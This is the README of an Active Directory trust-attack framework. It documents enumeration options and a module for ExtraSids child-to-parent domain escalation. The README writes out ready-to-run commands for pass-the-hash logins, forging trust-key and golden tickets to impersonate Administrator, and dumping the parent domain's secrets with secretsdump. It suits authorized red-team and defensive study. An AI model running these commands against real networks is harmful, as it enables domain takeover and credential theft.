<p align="center">
  <img src="assets/logo.png" alt="TrustFull" width="400"/>
</p>

<p align="center">
  <em>For anyone with trust issues</em>
</p>

<p align="center">
  Active Directory Trust Exploitation Framework
</p>

<p align="center">
  <a href="#overview">Overview</a> •
  <a href="#installation">Installation</a> •
  <a href="#usage">Usage</a> •
  <a href="EXAMPLES.md">Examples</a> •
  <a href="#detection-coverage">Detection</a>
</p>

---

## Overview

TrustFull is a comprehensive tool for enumerating and exploiting Active Directory trust relationships. It provides extensive detection capabilities across trust boundaries and implements the ExtraSids attack for parent-child domain escalation.

The tool addresses limitations in existing solutions by combining real-time enumeration, cross-trust attack detection, and built-in exploitation capabilities. It fixes critical issues with impacket-raiseChild on Windows Server 2022+ by properly preserving PAC buffers.

## Features

**Trust Enumeration**
- Complete trust relationship mapping with security property analysis
- Detection of SID filtering, selective authentication, and TGT delegation settings
- Attack surface identification with exploitation guidance

**Cross-Domain Attack Detection**
- Kerberoasting and ASREProasting across trust boundaries
- Unconstrained, constrained, and resource-based constrained delegation
- Foreign ACL scanning across users, groups, and organizational units
- Foreign security principal and group membership analysis
- SID history detection for ExtraSids abuse vectors
- Group Managed Service Account enumeration
- Shadow principal detection for PAM trust configurations

**Active Exploitation**
- badChild module for child-to-parent domain escalation
- Support for both trust key and golden ticket methods
- Compatible with Windows Server 2022 and modern domain functional levels

## Installation

```bash
git clone https://github.com/yourusername/trustfull.git
cd trustfull
pip3 install -e .
```

**Requirements:**
- Python 3.8+
- impacket >= 0.11.0
- ldap3 >= 2.9.0
- pycryptodome >= 3.15.0

## Usage

### Basic Enumeration

Enumerate trust relationships in the current domain:

```bash
trustfull enumerate domain.local/user:password -dc-ip 10.0.0.1
```

Using NTLM hash authentication:

```bash
trustfull enumerate domain.local/user -hashes :ntlmhash -dc-ip 10.0.0.1
```

### Cross-Trust Enumeration

Enumerate trusted domains and detect cross-domain attack vectors:

```bash
trustfull enumerate child.domain.local/user -hashes :hash -dc-ip 10.0.0.2 --cross-trust
```

Include foreign principal and ACL analysis:

```bash
trustfull enumerate domain.local/admin -hashes :hash -dc-ip 10.0.0.1 --foreign-principals
```

### ExtraSids Attack

Escalate from child domain to parent domain using the trust key method:

```bash
trustfull badChild child.domain.local/admin:password --trust-key
```

Alternative method using golden ticket:

```bash
trustfull badChild child.domain.local/admin:password --golden
```

Specify target user for impersonation:

```bash
trustfull badChild child.domain.local/admin:password --trust-key --target-user Administrator
```

The attack outputs a credential cache file that can be used with impacket tools:

```bash
export KRB5CCNAME=/path/to/output.ccache
impacket-secretsdump -k -no-pass parent.domain.local/Administrator@DC1.parent.domain.local
```

## Command Reference

### enumerate

```
trustfull enumerate <domain>/<user>[:<password>] [options]

Required:
  -dc-ip IP              Domain controller IP address

Authentication:
  -p PASSWORD            Password for authentication
  -hashes LMHASH:NTHASH  NTLM hashes (format: LM:NT or :NT)
  -aesKey KEY            AES key for Kerberos (128 or 256 bit)
  -k                     Use Kerberos authentication
  -no-pass               Do not prompt for password

Enumeration Options:
  --cross-trust          Enumerate trusted domains
  --foreign-principals   Scan for foreign ACLs and group members
  --recurse              Recursively enumerate trust relationships
  --debug                Enable debug output
```

### badChild

```
trustfull badChild <domain>/<user>[:<password>] [options]

Required:
  -dc-ip IP              Child domain controller IP address

Technique:
  --trust-key            Use inter-realm trust key (default)
  --golden               Use golden ticket method

Authentication:
  -p PASSWORD            Password for authentication
  -hashes LMHASH:NTHASH  NTLM hashes
  -aesKey KEY            AES key for Kerberos
  -k                     Use Kerberos authentication

Options:
  --target-user USER     Target user to impersonate (default: Administrator)
  -w PATH                Output path for credential cache
  --debug                Enable debug output
```

## Detection Coverage

The tool detects the following attack vectors in both local and cross-trust scenarios:

| Attack Vector | Description | Privilege Required |
|--------------|-------------|-------------------|
| Kerberoasting | Service accounts with SPNs | Domain User |
| ASREProasting | Accounts without Kerberos pre-authentication | Domain User |
| Unconstrained Delegation | Computers that can cache TGTs | Domain User |
| Constrained Delegation | Accounts with delegation to specific services | Domain User |
| RBCD | Resource-based constrained delegation | Domain User |
| Foreign ACLs | Cross-domain privilege escalation paths | Domain Admin (target) |
| Foreign Groups | Trusted principals in local groups | Domain User |
| SID History | ExtraSids abuse vectors | Domain User |
| gMSA | Group Managed Service Accounts | Domain User |
| Shadow Principals | PAM trust configurations | Domain User |

## Technical Details

### Why TrustFull Fixes impacket-raiseChild

The original impacket-raiseChild fails on Windows Server 2022 with `KDC_ERR_TGT_REVOKED` because it hardcodes exactly 4 PAC buffers and discards additional buffers. Windows Server 2022 with CVE-2021-42287 patches (KB5008380) added the PAC_REQUESTOR buffer (type 18), which domain controllers now validate. Stripping this buffer causes ticket rejection.

TrustFull's badChild module preserves all PAC buffers, ensuring compatibility with modern Windows Server versions while maintaining support for older systems.

### Cross-Trust Authentication

When enumerating trusted domains, TrustFull uses source domain credentials to authenticate against target domain controllers. This approach leverages the trust relationship to obtain inter-realm tickets automatically, allowing seamless cross-domain queries without requiring credentials in the target domain.

### Foreign ACL Detection

The tool scans the following objects for cross-domain ACLs:
- All user accounts
- All security groups
- Organizational units
- High-value targets (Domain Admins, Enterprise Admins, Schema Admins, etc.)
- Configuration naming context

Note that reading security descriptors requires Domain Admin privileges in the target domain.

## Known Limitations

**Privilege Requirements**
- Foreign ACL enumeration requires Domain Admin in the target domain
- Security descriptors are restricted to privileged users by default

**Remote Enumeration Constraints**
- Configuration NC attacks (GoldenGMSA, GPO-on-Site) require local SYSTEM access on domain controllers
- KDS root key attributes cannot be read remotely

**Not Implemented**
- CVE-2020-0665 SID filter bypass exploitation
- SQL Server database link enumeration
- MS-RPRN printer bug detection
- Protected Users group membership verification

## Testing

TrustFull has been tested against:
- Windows Server 2019
- Windows Server 2022
- Parent-child trust relationships
- Forest trust relationships (partial)
- External trust relationships (partial)

All core functionality has been validated in live Active Directory environments with comprehensive test scenarios covering delegation types, cross-domain attacks, and foreign principal detection.

## References

- [A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/) - harmj0y
- [Not A Security Boundary: Breaking Forest Trusts](https://specterops.io/blog/2018/11/28/not-a-security-boundary-breaking-forest-trusts/) - SpecterOps
- [The Trustpocalypse](https://blog.harmj0y.net/redteaming/the-trustpocalypse/) - harmj0y
- [An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf) - SpecterOps

## Credits

- harmj0y - Trust attack research and PowerView
- SpecterOps - Forest trust breaking research
- Sean Metcalf - ExtraSids attack discovery
- Benjamin Delpy - Mimikatz and Golden Ticket research
- Impacket team - Core Kerberos and LDAP libraries

## License

GPL-3.0

## Disclaimer

This tool is intended for authorized security testing and research purposes only. Unauthorized access to computer systems is illegal. Users are responsible for complying with applicable laws and regulations.
